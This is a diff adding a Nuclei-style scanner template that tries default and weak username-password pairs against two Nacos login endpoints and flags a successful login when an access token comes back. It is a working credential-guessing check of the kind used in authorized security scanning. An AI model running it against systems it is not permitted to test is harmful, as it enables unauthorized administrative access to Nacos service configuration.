@@ -1,0 +1,62 @@
+id: nacos-default-login
+
+info:
+  name: nacos-default-login
+  author: nacos
+  severity: high
+  tags: nacos
+
+http:
+  - raw:
+      - |
+        POST /nacos/v1/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+        username={{username}}&password={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "nacos"  # Nacos默认用户名
+        - "admin"  # 部分场景下可能使用的用户名
+      password:
+        - "nacos"  # Nacos默认密码
+        - "123456"
+        - "admin"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "accessToken")'  # 登录成功会返回token
+          - 'contains(body, "username")'
+        condition: and
+
+  - raw:
+      - |
+        POST /v1/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+        username={{username}}&password={{password}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "nacos"
+        - "admin"
+      password:
+        - "nacos"
+        - "123456"
+        - "admin"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "accessToken")'
+          - 'contains(body, "username")'
+        condition: and
